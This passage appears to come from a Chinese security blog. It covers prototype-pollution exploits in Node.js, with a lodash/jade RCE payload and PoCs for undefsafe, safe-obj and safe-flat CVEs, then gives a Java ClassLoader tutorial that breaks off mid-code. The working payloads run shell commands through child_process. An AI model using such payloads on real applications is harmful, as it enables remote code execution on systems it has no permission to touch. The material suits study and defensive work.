&amp; jade RCE"></a>lodash &amp; jade RCE</h3><p>Nodejs 的 jade 模板引擎也存在一个利用原型污染进行 RCE 的一个漏洞。但要实现 RCE，首先需要有原型链污染，这里我们依然使用 lodash.merge 方法中的原型链污染漏洞。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> lodash= <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><span class="hljs-keyword">var</span> jade = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jade&#x27;</span>);<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-comment">//设置模板的位置与种类</span><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, __dirname);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;view engine&quot;</span>, <span class="hljs-string">&quot;jade&quot;</span>);<br><br><span class="hljs-comment">//对原型进行污染</span><br><span class="hljs-keyword">var</span> malicious_payload = <span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;console.log(global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(\&#x27;calc\&#x27;))&quot;&#125;&#125;&#x27;</span>;<br>lodash.<span class="hljs-title function_">merge</span>(&#123;&#125;, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(malicious_payload));<br><br><span class="hljs-comment">//进行渲染</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-property">render</span> (<span class="hljs-string">&quot;index.jade&quot;</span>,&#123;<br>        <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;success&#x27;</span><br>    &#125;);<br>&#125;);<br><br><span class="hljs-comment">//设置http</span><br><span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8000</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><br>    <span class="hljs-keyword">var</span> host = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">address</span><br>    <span class="hljs-keyword">var</span> port = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span><br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;应用实例，访问地址为 http://%s:%s&quot;</span>, host, port)<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="0x05-Undefsafe-中的污染"><a href="#0x05-Undefsafe-中的污染" class="headerlink" title="0x05 Undefsafe 中的污染"></a>0x05 Undefsafe 中的污染</h2><p>Undefsafe模块是用来处理访问对象属性不存在时的报错问题，例如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> object = &#123;<br>    <span class="hljs-attr">a</span>: &#123;<br>        <span class="hljs-attr">b</span>: &#123;<br>            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;old_value&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object.<span class="hljs-property">a</span>.<span class="hljs-property">c</span>.<span class="hljs-property">e</span>)  <span class="hljs-comment">//打印不存在的属性</span><br><span class="hljs-comment">//程序报错</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">a</span>(object,<span class="hljs-string">&#x27;a.c.e&#x27;</span>)) <br><span class="hljs-comment">//undefined</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">a</span>(object,<span class="hljs-string">&#x27;a.b.e&#x27;</span>,<span class="hljs-string">&#x27;new_value&#x27;</span>)) <br><span class="hljs-comment">//new_value</span><br></code></pre></td></tr></table></figure><p>当我们使用undefsafe时，程序就不会报错而是返回<code>undefined</code>，如果目标属性存在，那么undefsafe就可以修改属性的值。如果该属性不存在，我们依然想赋值，那么新的属性将创建在数组中的上一层。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">a</span>(object,<span class="hljs-string">&#x27;a.c.e&#x27;</span>,<span class="hljs-string">&#x27;new_value&#x27;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object)<br><span class="hljs-comment">//&#123; a: &#123; b: &#123; c: 1, d: [Array], e: &#x27;old_value&#x27; &#125;, e: &#x27;new_value&#x27; &#125; &#125;</span><br></code></pre></td></tr></table></figure><p>漏洞编号CVE-2019-10795，ver &lt; 2.0.3，poc如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> test = &#123;&#125;<br><span class="hljs-title function_">a</span>(test,<span class="hljs-string">&#x27;__proto__.toString&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;just a evil!&#x27;</span>&#125;)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;this is &#x27;</span>+test)   <br><span class="hljs-comment">// this is just a evil!</span><br></code></pre></td></tr></table></figure><p>利用undefsafe对原型对象中的toString方法进行污染，再通过console.log触发，造成任意代码执行。</p><p>可见原型链污染不仅可以修改属性，也可以直接修改方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> test = &#123;&#125;<br><span class="hljs-title function_">a</span>(test,<span class="hljs-string">&#x27;__proto__.toString&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <span class="hljs-keyword">return</span> <span class="hljs-variable language_">global</span>.<span class="hljs-property">process</span>.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;id&#x27;</span>).<span class="hljs-title function_">toString</span>()&#125;)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;this is &#x27;</span>+test)<br><span class="hljs-comment">// this is uid=0(root) gid=0(root) groups=0(root)</span><br></code></pre></td></tr></table></figure><h2 id="0x06-safe-obj中的污染"><a href="#0x06-safe-obj中的污染" class="headerlink" title="0x06 safe-obj中的污染"></a>0x06 safe-obj中的污染</h2><h3 id="lodash-amp-safe-obj"><a href="#lodash-amp-safe-obj" class="headerlink" title="lodash &amp; safe-obj"></a>lodash &amp; safe-obj</h3><p>漏洞编号CVE-2021-25928，safe-obj_ver_1.0.0~1.0.2，关键点在expand方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">expand</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">obj, path, thing</span>) &#123;<br>  <span class="hljs-keyword">if</span> (!path &#124;&#124; <span class="hljs-keyword">typeof</span> thing === <span class="hljs-string">&#x27;undefined&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  obj = <span class="hljs-title function_">isObject</span>(obj) &amp;&amp; obj !== <span class="hljs-literal">null</span> ? obj : &#123;&#125;;<br>  <span class="hljs-keyword">var</span> props = path.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>); <span class="hljs-comment">//先用 . 分割</span><br>  <span class="hljs-keyword">if</span> (props.<span class="hljs-property">length</span> === <span class="hljs-number">1</span>) &#123;  <br>    obj[props.<span class="hljs-title function_">shift</span>()] = thing; <br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">var</span> prop = props.<span class="hljs-title function_">shift</span>(); <span class="hljs-comment">//shift()返回数组第一个元素</span><br>    <span class="hljs-keyword">if</span> (!(prop <span class="hljs-keyword">in</span> obj)) &#123;<br>      obj[prop] = &#123;&#125;;<br>    &#125;<br>    _safe.<span class="hljs-title function_">expand</span>(obj[prop], props.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;.&#x27;</span>), thing);<span class="hljs-comment">//递归调用expand，下一次满足props.length === 1</span><br>  &#125;<br>&#125;,<br></code></pre></td></tr></table></figure><p>poc如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> safeObj = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;safe-obj&quot;</span>);<br><span class="hljs-keyword">var</span> obj = &#123;&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Before : &quot;</span> + &#123;&#125;.<span class="hljs-property">polluted</span>);<br>safeObj.<span class="hljs-title function_">expand</span>(obj, <span class="hljs-string">&#x27;__proto__.polluted&#x27;</span>, <span class="hljs-string">&#x27;Yes! Its Polluted&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;After : &quot;</span> + &#123;&#125;.<span class="hljs-property">polluted</span>);<br><span class="hljs-comment">//Before : undefined</span><br><span class="hljs-comment">//After : Yes! Its Polluted</span><br></code></pre></td></tr></table></figure><h3 id="lodash-amp-safe-flat"><a href="#lodash-amp-safe-flat" class="headerlink" title="lodash &amp; safe-flat"></a>lodash &amp; safe-flat</h3><p>漏洞编号CVE-2021-25927，safe-flat_ver_2.0.0~2.0.1，关键在于unflatten</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">unflatten</span> = (<span class="hljs-params">obj, delimiter</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> result = &#123;&#125;<br>  <span class="hljs-keyword">const</span> seperator = delimiter &#124;&#124; defaultDelimiter<br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">&#x27;object&#x27;</span> &#124;&#124; <span class="hljs-title function_">isDate</span>(obj)) <span class="hljs-keyword">return</span> obj<br><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">unflat</span> = (<span class="hljs-params">original</span>) =&gt; &#123;<br>    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(original).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">const</span> newKeys = key.<span class="hljs-title function_">split</span>(seperator)<br>      newKeys.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">o, k, i</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">return</span> o[k] &#124;&#124; (o[k] = <span class="hljs-built_in">isNaN</span>(<span class="hljs-title class_">Number</span>(newKeys[i + <span class="hljs-number">1</span>])) ? (newKeys.<span class="hljs-property">length</span> - <span class="hljs-number">1</span> === i ? original[key] : &#123;&#125;) : [])<br>      &#125;, result)<br>    &#125;)<br>  &#125;<br><br>  <span class="hljs-title function_">unflat</span>(obj)<br>  <span class="hljs-keyword">return</span> result<br>&#125;<br></code></pre></td></tr></table></figure><p>通读代码可以发现实际上unflatten就是指定seperator对obj进行分割并组成新的键值对最后赋值，利用起来也很方便</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> safeFlat = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;safe-flat&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Before : &quot;</span> + &#123;&#125;.<span class="hljs-property">polluted</span>);<br>safeFlat.<span class="hljs-title function_">unflatten</span>(&#123;<span class="hljs-string">&quot;__proto__.polluted&quot;</span>: <span class="hljs-string">&quot;Yes! Its Polluted&quot;</span>&#125;, <span class="hljs-string">&#x27;.&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;After : &quot;</span> + &#123;&#125;.<span class="hljs-property">polluted</span>);<br><span class="hljs-comment">//Before : undefined</span><br><span class="hljs-comment">//After : Yes! Its Polluted</span><br></code></pre></td></tr></table></figure><h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><p><a href="https://xz.aliyun.com/t/12053#toc-1">关于Prototype Pollution Attack的二三事 - 先知社区 (aliyun.com)</a></p><p><a href="https://xz.aliyun.com/t/7184">https://xz.aliyun.com/t/7184</a></p><p><a href="https://www.anquanke.com/post/id/248170#h2-0">从 Lodash 原型链污染到模板 RCE-安全客 - 安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>原型链污染</tag>
      
      <tag>nodejs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ClassLoader</title>
    <link href="/2022/12/28/ClassLoader/"/>
    <url>/2022/12/28/ClassLoader/</url>
    
    <content type="html"><![CDATA[<h1 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h1><h2 id="0x00-ByteCode"><a href="#0x00-ByteCode" class="headerlink" title="0x00 ByteCode"></a>0x00 ByteCode</h2><p>​Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储 在.class文件中。字节码的本质就是一个字节数组 ，它有特定的复杂的内部格式，Java类初始化的时候会调用<strong>java.lang.ClassLoader</strong>加载字节码，.class文件中保存着Java代码经转换后的虚拟机指令，当需要使用某个类时，虚拟机将会加载它的.class文件，并创建对应的class对象，将class文件加载到虚拟机的内存，而在JVM中类的查找与装载就是由<strong>ClassLoader</strong>完成的。</p><img src="/2022/12/28/ClassLoader/image-20230205133431052.png" class="" title="image-20230205133431052"><p>ByteCode2Class脚本: <a href="https://github.com/hengyunabc/dumpclass">https://github.com/hengyunabc/dumpclass</a></p><h2 id="0x01-显式与隐式加载"><a href="#0x01-显式与隐式加载" class="headerlink" title="0x01 显式与隐式加载"></a>0x01 显式与隐式加载</h2><p>Java类加载方式分为显式和隐式</p><ul><li>显式：利用反射来加载一个类，Class.forName()等。</li><li>隐式：通过ClassLoader来动态加载，new 一个类或者 类名.方法名返回一个类。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadClassTest</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//1、反射加载，显式加载。</span><br>    Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>    System.out.println(aClass.getName());<br><br>    <span class="hljs-comment">//2、ClassLoader加载，隐式加载。</span><br>    Class&lt;?&gt; aClass1 = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>    System.out.println(aClass1.getName());<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x02-ClassLoader"><a href="#0x02-ClassLoader" class="headerlink" title="0x02 ClassLoader"></a>0x02 ClassLoader</h2><p>ClassLoader（类加载器）主要作用就是将class文件读入内存，并为之生成对应的java.lang.Class对象。</p><p>ClassLoader中的一些核心方法有：</p><ol><li><strong>loadClass(加载指定的Java类)</strong></li><li><strong>findClass(查找指定的Java类)</strong></li><li><strong>findLoadedClass(查找JVM已经加载过的类)</strong></li><li><strong>defineClass(定义一个Java类)</strong></li><li><strong>resolveClass(链接指定的Java类)</strong></li></ol><p>当我们正常加载一个Class的时候，方法的执行顺序也如上所示。</p><h3 id="内置ClassLoader"><a href="#内置ClassLoader" class="headerlink" title="内置ClassLoader"></a>内置ClassLoader</h3><p>JVM中存在3个内置ClassLoader：</p><ol><li>BootstrapClassLoader <strong>启动类加载器</strong> 负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME&#x2F;lib&#x2F;rt.jar 文件中，我们常用内置库 java.xxx.* 都在里面，比如 <strong>java.util.*、java.io.*、java.nio.*、java.lang.*</strong> 等等。</li><li>ExtensionClassLoader <strong>扩展类加载器</strong> 负责加载 JVM 扩展类，比如 swing 系列、内置的 js 引擎、xml 解析器 等等，这些库名通常以 javax 开头，它们的 jar 包位于 JAVA_HOME&#x2F;lib&#x2F;ext&#x2F;*.jar 中</li><li>AppClassLoader <strong>系统类加载器</strong> 才是直接面向我们用户的加载器，它会加载 Classpath 环境变量里定义的路径中的 jar 包和目录。<strong>我们自己编写的代码以及使用的第三方 jar 包通常都是由它来加载的</strong>。</li></ol><h3 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h3><p>除了内置的这三个ClassLoader，我们还可以<strong>自定义ClassLoader</strong>，自定义ClassLoader必须继承java.lang.ClassLoader类。一个简单的demo为例，定义一个类并获取其字节码再利用自定义ClassLoader加载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Person.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> String id;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String id,<span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.id=id;<br>        <span class="hljs-built_in">this</span>.age=age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;func hello called.&quot;</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//Util.java</span><br><span class="hljs-keyword">import</span> java.net.URI;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Util</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getByteArray</span><span class="hljs-params">(String className)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>      <span class="hljs-type">URI</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> Util.class.getClassLoader().getResource(className+<span class="hljs-string">&quot;.class&quot;</span>).toURI();<br>      <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(uri));<br>      <span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(bytes);<br>      <span class="hljs-keyword">return</span> base64;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编写自定义ClassLoader，并重写findClass()。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//MyClassLoader.java</span><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Person&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] byteArray;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            byteArray = Util.getByteArray(className);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-comment">//只处理Person类</span><br>        <span class="hljs-keyword">if</span> (name.equals(className))&#123;<br>            <span class="hljs-keyword">return</span> defineClass(className, byteArray, <span class="hljs-number">0</span>, byteArray.length );<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.findClass(name);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">MyClassLoader</span> <span class="hljs-variable">myClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClassLoader</span>();<br>        Class&lt;?&gt; aClass = myClassLoader.loadClass(className);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aClass.newInstance();<br>        <span class="hljs-comment">//调用Person类的hello()</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> o.getClass().getMethod(<span class="hljs-string">&quot;hello&quot;</span>);<br>        m.invoke(o);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//输出: func hello called.</span><br><br></code></pre></td></tr></table></figure><h3 id="双亲委派模型"><a href="#双亲委派模型" class="headerlink" title="双亲委派模型"></a>双亲委派模型</h3><p>双亲委派模型展示了类的实际加载过程以及ClassLoader的使用顺序。</p><img src="/2022/12/28/ClassLoader/image-20230205142823459.png" class="" title="image-20230205142823459"><p>先不考虑自定义ClassLoader，加入我们编写一个普通类，那么它的加载过程就可以用上图来表示。</p><p>双亲委派可以简单理解为：<strong>向上委派，向下加载</strong></p><p>当一个.class文件要被加载时首先会在AppClassLoader检查是否已被加载，如果加载过就不再加载，如果没有被加载则向上，也就是父加载器委派，父加载器重复这个过程直到BootstrapClassLoader，如果BootstrapClassLoader也没有加载过此类则开始向下加载；首先询问BootstrapClassLoader是否可以加载，如果可以就自己加载，如果不可以则向下加载；子加载器重复这个过程直到AppClassloader，如果AppClassloader也无法加载则抛出ClassNotFoundException异常。</p><p><strong>如果我们自定义了ClassLoader并加载类，那么就会先从自定义ClassLoader开始加载，顺序上先于AppClassLoader。</strong></p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>从双亲委派模型来理解上文中几个方法(loadClass、findClass….)：</p><ul><li>如果我们要自定义加载一个类，那么首先调用loadClass去检查这个类是否被加载过，同样是向上委派的过程。如果没有发现类被记载则调用findClass。</li><li>findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass 。</li><li>defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类。</li></ul><p>值得注意的是，defineClass方法并不会调用类的静态代码块或者构造方法，相关的调用如下：</p><ul><li>初始化：静态代码块</li><li>实例化：构造代码块\无参构造函数</li></ul><p>而使用Class.forName进行动态类加载有两种模式，初始化与不初始化，<strong>默认是初始化</strong>。</p><p>指定初始化会调用静态代码块，禁止初始化不会调用静态代码块。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//默认开启初始化</span><br>Class.forName(<span class="hljs-string">&quot;Person&quot;</span>);<br><span class="hljs-comment">//关闭初始化</span><br>Class.forName(<span class="hljs-string">&quot;Person&quot;</span>,<span class="hljs-literal">false</span>,getSystemClassLoader());<br><br></code></pre></td></tr></table></figure><h2 id="0x03-加载字节码的几种方式"><a href="#0x03-加载字节码的几种方式" class="headerlink" title="0x03 加载字节码的几种方式"></a>0x03 加载字节码的几种方式</h2><h3 id="1-利用defineClass"><a href="#1-利用defineClass" class="headerlink" title="1.利用defineClass()"></a>1.利用defineClass()</h3><p>上面已经提到defineClass()会将Class转换成类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method; <br><span class="hljs-keyword">import</span> java.util.Base64; <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloDefineClass</span> &#123; <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span 